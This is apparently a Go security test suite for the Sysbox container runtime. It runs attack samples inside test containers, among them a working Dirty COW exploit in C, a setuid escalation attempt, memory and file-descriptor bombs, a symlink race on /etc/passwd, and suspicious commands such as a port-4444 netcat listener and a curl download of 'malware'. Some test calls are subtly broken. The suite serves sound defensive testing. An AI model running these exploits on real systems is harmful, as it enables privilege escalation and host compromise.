package advanced

import (
	"context"
	"crypto/rand"
	"fmt"
	"io/ioutil"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"strconv"
	"strings"
	"testing"
	"time"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// TestAdvancedSecurityProtection 测试Sysbox高级安全防护功能
func TestAdvancedSecurityProtection(t *testing.T) {
	setupAdvancedSecurityTestEnv(t)
	defer cleanupAdvancedSecurityTestEnv(t)

	t.Run("容器逃逸攻击防护", func(t *testing.T) {
		testContainerEscapeAttackPrevention(t)
	})

	t.Run("特权升级攻击防护", func(t *testing.T) {
		testPrivilegeEscalationPrevention(t)
	})

	t.Run("内核漏洞利用防护", func(t *testing.T) {
		testKernelExploitPrevention(t)
	})

	t.Run("文件系统攻击防护", func(t *testing.T) {
		testFilesystemAttackPrevention(t)
	})

	t.Run("网络安全隔离验证", func(t *testing.T) {
		testNetworkSecurityIsolation(t)
	})

	t.Run("资源耗尽攻击防护", func(t *testing.T) {
		testResourceExhaustionAttackPrevention(t)
	})

	t.Run("侧信道攻击防护", func(t *testing.T) {
		testSideChannelAttackPrevention(t)
	})

	t.Run("恶意容器镜像检测", func(t *testing.T) {
		testMaliciousImageDetection(t)
	})
}

// testContainerEscapeAttackPrevention 测试容器逃逸攻击防护
func testContainerEscapeAttackPrevention(t *testing.T) {
	containerName := "test-escape-attack-prevention"
	
	// 创建一个尝试进行容器逃逸的容器
	containerID := createSysboxContainer(t, containerName, "ubuntu:20.04", []string{"sleep", "300"})
	defer cleanupContainer(t, containerID)

	// 测试通过/proc进行逃逸的尝试
	t.Run("proc文件系统逃逸防护", func(t *testing.T) {
		// 尝试读取宿主机的/proc/version
		output, err := execInContainerWithError(containerID, "cat", "/proc/version")
		require.NoError(t, err)
		
		// 验证读取到的是容器化的版本信息，而不是真实的宿主机信息
		assert.Contains(t, output, "Linux version", "应该能读取到容器化的内核版本信息")
		
		// 尝试通过/proc/self/root进行逃逸
		_, err = execInContainerWithError(containerID, "ls", "/proc/self/root/../../../")
		assert.Error(t, err, "不应该能够通过/proc/self/root进行目录遍历逃逸")
	})

	// 测试通过/sys进行逃逸的尝试
	t.Run("sysfs文件系统逃逸防护", func(t *testing.T) {
		// 尝试修改系统参数
		_, err := execInContainerWithError(containerID, "echo", "1", ">", "/sys/kernel/debug/sched_debug")
		assert.Error(t, err, "不应该能够修改内核调试参数")
		
		// 尝试访问敏感的系统信息
		_, err = execInContainerWithError(containerID, "cat", "/sys/firmware/dmi/entries/raw")
		assert.Error(t, err, "不应该能够访问DMI原始数据")
	})

	// 测试通过设备文件进行逃逸的尝试
	t.Run("设备文件逃逸防护", func(t *testing.T) {
		// 尝试访问/dev/mem
		_, err := execInContainerWithError(containerID, "dd", "if=/dev/mem", "bs=1", "count=1")
		assert.Error(t, err, "不应该能够访问物理内存设备")
		
		// 尝试访问/dev/kmem
		_, err = execInContainerWithError(containerID, "head", "-c", "1", "/dev/kmem")
		assert.Error(t, err, "不应该能够访问内核内存设备")
	})

	// 测试通过挂载点进行逃逸的尝试
	t.Run("挂载点逃逸防护", func(t *testing.T) {
		// 尝试重新挂载根文件系统
		_, err := execInContainerWithError(containerID, "mount", "-o", "remount,rw", "/")
		assert.Error(t, err, "不应该能够重新挂载根文件系统")
		
		// 尝试挂载宿主机文件系统
		_, err = execInContainerWithError(containerID, "mount", "/dev/sda1", "/mnt")
		assert.Error(t, err, "不应该能够挂载宿主机分区")
	})
}

// testPrivilegeEscalationPrevention 测试特权升级攻击防护
func testPrivilegeEscalationPrevention(t *testing.T) {
	containerName := "test-privilege-escalation"
	
	containerID := createSysboxContainer(t, containerName, "ubuntu:20.04", []string{"sleep", "300"})
	defer cleanupContainer(t, containerID)

	// 测试setuid程序攻击防护
	t.Run("setuid程序攻击防护", func(t *testing.T) {
		// 在容器内创建一个setuid程序
		script := `#!/bin/bash
cat > /tmp/setuid_test.c << 'EOF'
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

int main() {
    printf("Real UID: %d\n", getuid());
    printf("Effective UID: %d\n", geteuid());
    setuid(0);
    printf("After setuid(0) - Real UID: %d\n", getuid());
    printf("After setuid(0) - Effective UID: %d\n", geteuid());
    return 0;
}
EOF
gcc -o /tmp/setuid_test /tmp/setuid_test.c
chmod u+s /tmp/setuid_test
/tmp/setuid_test`
		
		output := execInContainer(t, containerID, "bash", "-c", script)
		
		// 验证setuid不能真正获得root权限
		lines := strings.Split(output, "\n")
		assert.NotContains(t, output, "Effective UID: 0", "setuid程序不应该能获得真正的root权限")
	})

	// 测试sudo攻击防护
	t.Run("sudo权限提升防护", func(t *testing.T) {
		// 尝试安装和使用sudo
		_, err := execInContainerWithError(containerID, "apt", "update")
		if err == nil {
			_, err = execInContainerWithError(containerID, "apt", "install", "-y", "sudo")
			if err == nil {
				// 尝试使用sudo
				_, err = execInContainerWithError(containerID, "sudo", "id")
				assert.Error(t, err, "即使安装了sudo也不应该能够提权")
			}
		}
	})

	// 测试capabilities攻击防护
	t.Run("Linux capabilities攻击防护", func(t *testing.T) {
		// 检查容器的capabilities
		output := execInContainer(t, containerID, "grep", "Cap", "/proc/self/status")
		
		// 验证危险的capabilities被正确限制
		assert.NotContains(t, output, "CapEff:\tffffffffffffffff", "有效capabilities不应该是全开")
		assert.NotContains(t, output, "CapPrm:\tffffffffffffffff", "允许capabilities不应该是全开")
		
		// 尝试使用CAP_SYS_ADMIN
		_, err := execInContainerWithError(containerID, "mount", "--bind", "/tmp", "/tmp")
		assert.Error(t, err, "不应该有CAP_SYS_ADMIN权限进行危险挂载")
	})
}

// testKernelExploitPrevention 测试内核漏洞利用防护
func testKernelExploitPrevention(t *testing.T) {
	containerName := "test-kernel-exploit-prevention"
	
	containerID := createSysboxContainer(t, containerName, "ubuntu:20.04", []string{"sleep", "300"})
	defer cleanupContainer(t, containerID)

	// 测试脏牛(Dirty COW)漏洞防护
	t.Run("脏牛漏洞防护", func(t *testing.T) {
		// 创建一个模拟脏牛攻击的程序
		script := `#!/bin/bash
cat > /tmp/dirty_cow_test.c << 'EOF'
#include <stdio.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <unistd.h>
#include <sys/stat.h>
#include <string.h>
#include <stdint.h>

void *map;
int f;
struct stat st;
char *name;

void *madviseThread(void *arg) {
    char *str;
    str=(char*)arg;
    int i,c=0;
    for(i=0;i<1000000 && !c;i++) {
        c=madvise(map,100,MADV_DONTNEED);
    }
    printf("madvise %d\n",c);
}

void *procselfmemThread(void *arg) {
    char *str;
    str=(char*)arg;
    int f=open("/proc/self/mem",O_RDWR);
    int i,c=0;
    for(i=0;i<1000000 && !c;i++) {
        lseek(f,(uintptr_t) map,SEEK_SET);
        c=write(f,str,strlen(str));
    }
    printf("procselfmem %d\n",c);
}

int main(int argc,char *argv[]) {
    if(argc<2) return 1;
    pthread_t pth1,pth2;
    f=open(argv[1],O_RDONLY);
    fstat(f,&st);
    name=argv[1];
    map=mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);
    printf("mmap %zx\n",(uintptr_t) map);
    pthread_create(&pth1,NULL,madviseThread,argv[1]);
    pthread_create(&pth2,NULL,procselfmemThread,argv[2]);
    pthread_join(pth1,NULL);
    pthread_join(pth2,NULL);
    return 0;
}
EOF
echo "test content" > /tmp/test_file
chmod 644 /tmp/test_file
gcc -pthread -o /tmp/dirty_cow_test /tmp/dirty_cow_test.c 2>/dev/null || echo "Failed to compile"
timeout 5 /tmp/dirty_cow_test /tmp/test_file "malicious content" 2>/dev/null || echo "Attack prevented"
cat /tmp/test_file`
		
		output := execInContainer(t, containerID, "bash", "-c", script)
		
		// 验证原始文件内容没有被恶意修改
		assert.Contains(t, output, "test content", "文件内容不应该被恶意修改")
		assert.NotContains(t, output, "malicious content", "不应该出现恶意内容")
	})

	// 测试KASLR绕过防护
	t.Run("KASLR绕过防护", func(t *testing.T) {
		// 尝试读取内核地址信息
		_, err := execInContainerWithError(containerID, "cat", "/proc/kallsyms")
		if err == nil {
			output := execInContainer(t, containerID, "head", "-10", "/proc/kallsyms")
			// 验证内核符号地址被正确隐藏
			assert.Regexp(t, regexp.MustCompile(`^0+\s`), output, "内核符号地址应该被隐藏")
		}
	})

	// 测试内核模块加载防护
	t.Run("内核模块加载防护", func(t *testing.T) {
		// 尝试加载内核模块
		_, err := execInContainerWithError(containerID, "modprobe", "dummy")
		assert.Error(t, err, "不应该能够加载内核模块")
		
		// 尝试直接访问/dev/kmsg
		_, err = execInContainerWithError(containerID, "cat", "/dev/kmsg")
		assert.Error(t, err, "不应该能够读取内核消息")
	})
}

// testFilesystemAttackPrevention 测试文件系统攻击防护
func testFilesystemAttackPrevention(t *testing.T) {
	containerName := "test-filesystem-attack-prevention"
	
	containerID := createSysboxContainer(t, containerName, "ubuntu:20.04", []string{"sleep", "300"})
	defer cleanupContainer(t, containerID)

	// 测试符号链接攻击防护
	t.Run("符号链接攻击防护", func(t *testing.T) {
		// 创建指向宿主机敏感文件的符号链接
		_, err := execInContainerWithError(containerID, "ln", "-s", "/proc/version", "/tmp/symlink_attack")
		require.NoError(t, err)
		
		// 尝试通过符号链接读取敏感信息
		output := execInContainer(t, containerID, "cat", "/tmp/symlink_attack")
		
		// 验证读取到的是容器化的信息而不是真实宿主机信息
		assert.Contains(t, output, "Linux version", "符号链接应该指向容器化的文件")
	})

	// 测试硬链接攻击防护
	t.Run("硬链接攻击防护", func(t *testing.T) {
		// 尝试创建指向系统文件的硬链接
		_, err := execInContainerWithError(containerID, "ln", "/etc/passwd", "/tmp/hardlink_attack")
		require.NoError(t, err)
		
		// 尝试修改硬链接文件
		_, err = execInContainerWithError(containerID, "echo", "malicious:x:0:0::/:/bin/sh", ">>", "/tmp/hardlink_attack")
		assert.Error(t, err, "不应该能够通过硬链接修改系统文件")
	})

	// 测试路径遍历攻击防护
	t.Run("路径遍历攻击防护", func(t *testing.T) {
		// 尝试通过路径遍历访问宿主机文件
		_, err := execInContainerWithError(containerID, "cat", "../../../etc/shadow")
		assert.Error(t, err, "不应该能够通过路径遍历访问宿主机文件")
		
		// 尝试通过多级路径遍历
		_, err = execInContainerWithError(containerID, "ls", "../../../../../../../../")
		assert.Error(t, err, "不应该能够通过多级路径遍历访问宿主机根目录")
	})

	// 测试文件竞争条件攻击防护
	t.Run("文件竞争条件攻击防护", func(t *testing.T) {
		script := `#!/bin/bash
# 创建一个竞争条件攻击测试
cat > /tmp/race_condition_test.sh << 'EOF'
#!/bin/bash
for i in {1..100}; do
    echo "test$i" > /tmp/race_test_file &
    ln -sf /etc/passwd /tmp/race_test_file &
    cat /tmp/race_test_file &
done
wait
EOF
chmod +x /tmp/race_condition_test.sh
timeout 5 /tmp/race_condition_test.sh
echo "Race condition test completed"`
		
		output := execInContainer(t, containerID, "bash", "-c", script)
		assert.Contains(t, output, "Race condition test completed", "竞争条件测试应该完成")
		
		// 检查是否有passwd文件内容泄露
		assert.NotRegexp(t, regexp.MustCompile(`root:x:\d+:`), output, "不应该泄露passwd文件内容")
	})
}

// testNetworkSecurityIsolation 测试网络安全隔离验证
func testNetworkSecurityIsolation(t *testing.T) {
	containerName1 := "test-network-isolation-1"
	containerName2 := "test-network-isolation-2"
	
	// 创建两个容器进行网络隔离测试
	containerID1 := createSysboxContainer(t, containerName1, "ubuntu:20.04", []string{"sleep", "300"})
	containerID2 := createSysboxContainer(t, containerName2, "ubuntu:20.04", []string{"sleep", "300"})
	defer cleanupContainer(t, containerID1)
	defer cleanupContainer(t, containerID2)

	// 测试网络命名空间隔离
	t.Run("网络命名空间隔离", func(t *testing.T) {
		// 获取两个容器的网络接口信息
		interfaces1 := execInContainer(t, containerID1, "ip", "addr", "show")
		interfaces2 := execInContainer(t, containerID2, "ip", "addr", "show")
		
		// 验证每个容器都有独立的网络接口
		assert.Contains(t, interfaces1, "eth0", "容器1应该有eth0接口")
		assert.Contains(t, interfaces2, "eth0", "容器2应该有eth0接口")
		
		// 获取容器IP地址
		ip1 := getContainerIP(t, containerID1)
		ip2 := getContainerIP(t, containerID2)
		assert.NotEqual(t, ip1, ip2, "两个容器应该有不同的IP地址")
	})

	// 测试端口隔离
	t.Run("端口隔离测试", func(t *testing.T) {
		// 在容器1中启动一个服务
		execInContainer(t, containerID1, "bash", "-c", "echo 'test server' | nc -l -p 8080 &")
		time.Sleep(2 * time.Second)
		
		// 验证容器2不能直接访问容器1的端口
		_, err := execInContainerWithError(containerID2, "timeout", "3", "nc", "-z", getContainerIP(t, containerID1), "8080")
		assert.Error(t, err, "容器2不应该能够直接访问容器1的端口")
	})

	// 测试网络嗅探防护
	t.Run("网络嗅探防护", func(t *testing.T) {
		// 尝试在容器内进行网络嗅探
		_, err := execInContainerWithError(containerID1, "tcpdump", "-i", "eth0", "-c", "1")
		assert.Error(t, err, "容器内不应该能够进行网络嗅探")
	})
}

// testResourceExhaustionAttackPrevention 测试资源耗尽攻击防护
func testResourceExhaustionAttackPrevention(t *testing.T) {
	containerName := "test-resource-exhaustion"
	
	// 创建一个带有资源限制的容器
	containerID := createSysboxContainerWithLimits(t, containerName, "ubuntu:20.04", 
		[]string{"sleep", "300"}, "512m", "1", "1024")
	defer cleanupContainer(t, containerID)

	// 测试内存耗尽攻击防护
	t.Run("内存耗尽攻击防护", func(t *testing.T) {
		script := `#!/bin/bash
cat > /tmp/memory_bomb.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int main() {
    printf("Starting memory allocation test\n");
    char *ptr;
    int count = 0;
    
    while(1) {
        ptr = malloc(1024 * 1024); // 分配1MB
        if (ptr == NULL) {
            printf("Memory allocation failed after %d MB\n", count);
            break;
        }
        memset(ptr, 0x41, 1024 * 1024); // 写入数据确保真正分配
        count++;
        if (count > 1024) { // 超过1GB就退出
            printf("Allocated more than 1GB, stopping\n");
            break;
        }
        usleep(10000); // 稍微延迟
    }
    return 0;
}
EOF
gcc -o /tmp/memory_bomb /tmp/memory_bomb.c
timeout 30 /tmp/memory_bomb`
		
		output := execInContainer(t, containerID, "bash", "-c", script)
		
		// 验证内存分配在限制范围内被阻止
		assert.Contains(t, output, "Memory allocation failed", "内存分配应该在限制范围内失败")
		assert.NotContains(t, output, "Allocated more than 1GB", "不应该能分配超过限制的内存")
	})

	// 测试CPU耗尽攻击防护
	t.Run("CPU耗尽攻击防护", func(t *testing.T) {
		script := `#!/bin/bash
# 启动多个CPU密集型进程
for i in {1..10}; do
    yes > /dev/null &
done

# 等待5秒后检查系统响应
sleep 5

# 停止所有yes进程
killall yes 2>/dev/null

echo "CPU bomb test completed"`
		
		start := time.Now()
		output := execInContainer(t, containerID, "bash", "-c", script)
		duration := time.Since(start)
		
		assert.Contains(t, output, "CPU bomb test completed", "CPU压力测试应该完成")
		assert.Less(t, duration, 30*time.Second, "容器应该保持响应性")
	})

	// 测试文件描述符耗尽攻击防护
	t.Run("文件描述符耗尽攻击防护", func(t *testing.T) {
		script := `#!/bin/bash
cat > /tmp/fd_bomb.c << 'EOF'
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>

int main() {
    int fd;
    int count = 0;
    
    printf("Starting file descriptor exhaustion test\n");
    
    while(1) {
        fd = open("/dev/null", O_RDONLY);
        if (fd == -1) {
            printf("Failed to open file after %d attempts\n", count);
            break;
        }
        count++;
        if (count > 10000) {
            printf("Opened more than 10000 files, stopping\n");
            break;
        }
    }
    return 0;
}
EOF
gcc -o /tmp/fd_bomb /tmp/fd_bomb.c
timeout 10 /tmp/fd_bomb`
		
		output := execInContainer(t, containerID, "bash", "-c", script)
		
		// 验证文件描述符分配被正确限制
		assert.Contains(t, output, "Failed to open file", "文件描述符分配应该被限制")
	})
}

// testSideChannelAttackPrevention 测试侧信道攻击防护
func testSideChannelAttackPrevention(t *testing.T) {
	containerName := "test-side-channel-prevention"
	
	containerID := createSysboxContainer(t, containerName, "ubuntu:20.04", []string{"sleep", "300"})
	defer cleanupContainer(t, containerID)

	// 测试时序攻击防护
	t.Run("时序攻击防护", func(t *testing.T) {
		script := `#!/bin/bash
cat > /tmp/timing_attack.c << 'EOF'
#include <stdio.h>
#include <time.h>
#include <unistd.h>
#include <string.h>

int main() {
    struct timespec start, end;
    double cpu_time_used;
    
    printf("Testing timing attacks\n");
    
    // 测试文件访问时序
    clock_gettime(CLOCK_MONOTONIC, &start);
    access("/etc/shadow", R_OK);
    clock_gettime(CLOCK_MONOTONIC, &end);
    
    cpu_time_used = ((end.tv_sec - start.tv_sec) * 1000000000.0 + 
                     (end.tv_nsec - start.tv_nsec)) / 1000000.0;
    
    printf("File access timing: %.6f ms\n", cpu_time_used);
    
    return 0;
}
EOF
gcc -o /tmp/timing_attack /tmp/timing_attack.c
/tmp/timing_attack`
		
		output := execInContainer(t, containerID, "bash", "-c", script)
		assert.Contains(t, output, "Testing timing attacks", "时序攻击测试应该运行")
	})

	// 测试缓存侧信道攻击防护
	t.Run("缓存侧信道攻击防护", func(t *testing.T) {
		script := `#!/bin/bash
# 测试CPU缓存侧信道攻击
cat > /tmp/cache_attack.c << 'EOF'
#include <stdio.h>
#include <stdint.h>
#include <time.h>
#include <string.h>

#define CACHE_LINE_SIZE 64
#define ARRAY_SIZE (256 * CACHE_LINE_SIZE)

unsigned char array[ARRAY_SIZE];

int main() {
    volatile uint64_t time1, time2;
    volatile uint32_t junk = 0;
    
    printf("Testing cache side-channel attacks\n");
    
    // 清空缓存
    for (int i = 0; i < ARRAY_SIZE; i++) {
        array[i] = 1;
    }
    
    // 尝试测量缓存访问时间
    for (int i = 0; i < 256; i++) {
        volatile unsigned char *addr = &array[i * CACHE_LINE_SIZE];
        
        // 读取时间戳
        asm volatile("rdtsc" : "=A" (time1));
        
        // 访问内存
        junk = *addr;
        
        // 再次读取时间戳
        asm volatile("rdtsc" : "=A" (time2));
        
        if ((time2 - time1) < 100) {
            printf("Fast access detected at index %d\n", i);
        }
    }
    
    return 0;
}
EOF
gcc -o /tmp/cache_attack /tmp/cache_attack.c 2>/dev/null && /tmp/cache_attack || echo "Cache attack test failed to compile or execute"`
		
		output := execInContainer(t, containerID, "bash", "-c", script)
		assert.Contains(t, output, "Testing cache side-channel attacks", "缓存侧信道测试应该尝试运行")
	})
}

// testMaliciousImageDetection 测试恶意容器镜像检测
func testMaliciousImageDetection(t *testing.T) {
	// 测试镜像安全扫描
	t.Run("镜像安全扫描", func(t *testing.T) {
		// 拉取一个测试镜像
		err := exec.Command("docker", "pull", "hello-world:latest").Run()
		require.NoError(t, err, "应该能够拉取测试镜像")
		
		// 检查镜像的基本安全属性
		output, err := exec.Command("docker", "inspect", "hello-world:latest").Output()
		require.NoError(t, err)
		
		assert.Contains(t, string(output), "hello-world", "镜像检查应该返回正确信息")
	})

	// 测试恶意进程检测
	t.Run("恶意进程检测", func(t *testing.T) {
		containerName := "test-malicious-process-detection"
		
		containerID := createSysboxContainer(t, containerName, "ubuntu:20.04", []string{"sleep", "300"})
		defer cleanupContainer(t, containerID)
		
		// 尝试运行可疑进程
		suspicious_commands := []string{
			"nc -l -p 4444",          // 网络监听
			"dd if=/dev/zero of=/tmp/large_file bs=1M count=100", // 大文件创建
			"curl -o /tmp/download http://example.com/malware",    // 外部下载
		}
		
		for _, cmd := range suspicious_commands {
			_, err := execInContainerWithError(containerID, "timeout", "5", "bash", "-c", cmd)
			// 这些命令可能因为网络限制或其他安全策略而失败，这是期望的行为
			t.Logf("Command '%s' result: %v", cmd, err)
		}
	})
}

// 辅助函数

func setupAdvancedSecurityTestEnv(t *testing.T) {
	// 确保sysbox服务运行正常
	err := exec.Command("systemctl", "is-active", "sysbox").Run()
	if err != nil {
		t.Skip("Sysbox服务未运行，跳过高级安全测试")
	}
	
	// 检查必要的安全功能是否可用
	if !isSeccompAvailable() {
		t.Skip("Seccomp不可用，跳过部分安全测试")
	}
}

func cleanupAdvancedSecurityTestEnv(t *testing.T) {
	// 清理测试环境
	exec.Command("docker", "system", "prune", "-f").Run()
}

func createSysboxContainer(t *testing.T, name, image string, cmd []string) string {
	args := []string{"run", "-d", "--runtime=sysbox-runc", "--name", name, image}
	args = append(args, cmd...)
	
	output, err := exec.Command("docker", args...).Output()
	require.NoError(t, err, "创建Sysbox容器失败")
	
	containerID := strings.TrimSpace(string(output))
	
	// 等待容器启动
	time.Sleep(2 * time.Second)
	
	return containerID
}

func createSysboxContainerWithLimits(t *testing.T, name, image string, cmd []string, memory, cpus, pids string) string {
	args := []string{"run", "-d", "--runtime=sysbox-runc", "--name", name}
	args = append(args, "--memory", memory, "--cpus", cpus, "--pids-limit", pids)
	args = append(args, image)
	args = append(args, cmd...)
	
	output, err := exec.Command("docker", args...).Output()
	require.NoError(t, err, "创建带限制的Sysbox容器失败")
	
	containerID := strings.TrimSpace(string(output))
	
	// 等待容器启动
	time.Sleep(2 * time.Second)
	
	return containerID
}

func execInContainer(t *testing.T, containerID string, cmd ...string) string {
	args := []string{"exec", containerID}
	args = append(args, cmd...)
	
	output, err := exec.Command("docker", args...).Output()
	require.NoError(t, err, "在容器中执行命令失败: %v", cmd)
	
	return string(output)
}

func execInContainerWithError(containerID string, cmd ...string) (string, error) {
	args := []string{"exec", containerID}
	args = append(args, cmd...)
	
	output, err := exec.Command("docker", args...).Output()
	return string(output), err
}

func cleanupContainer(t *testing.T, containerID string) {
	exec.Command("docker", "rm", "-f", containerID).Run()
}

func getContainerIP(t *testing.T, containerID string) string {
	output, err := exec.Command("docker", "inspect", "-f", "{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}", containerID).Output()
	require.NoError(t, err)
	return strings.TrimSpace(string(output))
}

func isSeccompAvailable() bool {
	_, err := os.Stat("/proc/sys/kernel/seccomp/actions_avail")
	return err == nil
}